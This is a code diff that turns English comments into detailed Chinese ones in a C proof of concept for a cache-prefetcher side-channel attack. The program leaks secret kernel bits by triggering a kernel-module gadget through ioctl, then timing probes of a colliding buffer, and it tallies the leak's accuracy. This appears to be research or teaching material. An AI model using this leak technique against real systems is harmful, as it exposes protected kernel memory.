@@ -6,16 +6,19 @@
 
 #include "common.h"
 
-// file descriptor of kernel module
+// 文件描述符，用于与内核模块通信
 static int module_fd;
 
 // colliding load instruction
+// 指向加载（load）指令的函数指针，这个指令将是侧信道攻击的目标，因为它在用户空间和内核空间之间共享。
 static load_gadget_f gadget;
 
 // colliding buffer
+// 用于缓存冲突的缓冲区，它与内核模块中的某个缓冲区映射到相同的物理内存页，但处于不同的虚拟地址空间。
 static uint8_t* colliding_buffer;
 
 // threshold to distinguish cache hit from cache miss
+// 用于区分缓存命中和缓存未命中的时间阈值
 static uint64_t threshold;
 
 // 尝试泄露单个比特的函数
@@ -26,19 +29,25 @@ uint64_t leak_bit(size_t offset, size_t stride) {
     flush(colliding_buffer + 3 * stride); 
     mfence();
 
-    // access in kernel to kernel_buffer to if secret at index we want to leak is one
+    // 通过ioctl调用内核模块，使内核访问其内部的kernel_buffer。
+    // 如果offset参数指向的内核内存位置是“1”，则内核会访问该位置，导致相应的缓存行被加载。
     ioctl(module_fd, CMD_GADGET_CF, offset);
     mfence();
    
-    // more accesses in userspace.
-    // if offset is guessed correctly, this follows the stride and will prefetch.
-    // otherwise, this will not prefetch.
+    // 在用户空间进行更多的访问。
+    // 如果之前内核的访问命中了我们的“猜测”（即offset对应的内核秘密位为1），
+    // 那么这里对colliding_buffer的访问会遵循一定的步幅（stride），并可能触发预取（prefetch）。
+    // 否则，如果猜测不正确，则不会触发预取。
     gadget(colliding_buffer + 1 * stride);
     mfence();
     gadget(colliding_buffer + 2 * stride);
     mfence();
 
-    // faset access time -> was prefetched -> kernel_buffer was accessed -> secret bit is 1
+    // 探测colliding_buffer + 3 * stride处的访问时间。
+    // 如果访问时间很短（低于阈值），表示被预取（或直接缓存命中），
+    // 这意味着内核的访问确实发生了，因此秘密位是“1”。
+    // 否则，如果访问时间较长（高于阈值），表示未被预取（缓存未命中），
+    // 意味着内核的访问没有发生，秘密位是“0”。
     return probe(colliding_buffer + 3 * stride) < threshold;
 }
 
@@ -65,23 +74,23 @@ static uint8_t leak_byte(size_t offset) {
 static void analyze_leakage(uint8_t reference, uint8_t observed, uint32_t* correct, uint32_t* false_positives, uint32_t* false_negatives, uint32_t* positives, uint32_t* negatives) {
     for(uint32_t i = 0; i < 8; i++) {
         uint32_t mask = 1 << i;
-        
+        // 统计真实的正例和负例
         if(reference & mask){
             *positives += 1;
         } else {
             *negatives += 1;
         }
-        
-        if((reference ^ observed) & mask) {
+        // 检查参考值和观察值是否不同
+        if((reference ^ observed) & mask) { // 如果两个比特位不相同
             if(observed & mask) {
-                // false positive
+                // 观察到的是1，但参考是0 -> 误报
                 *false_positives += 1;
             } else {
-                // false neagative
+                // 观察到的是0，但参考是1 -> 漏报
                 *false_negatives += 1;
             }
         } else {
-            // correct
+            // 相同 -> 正确
             *correct += 1;
         }
     }
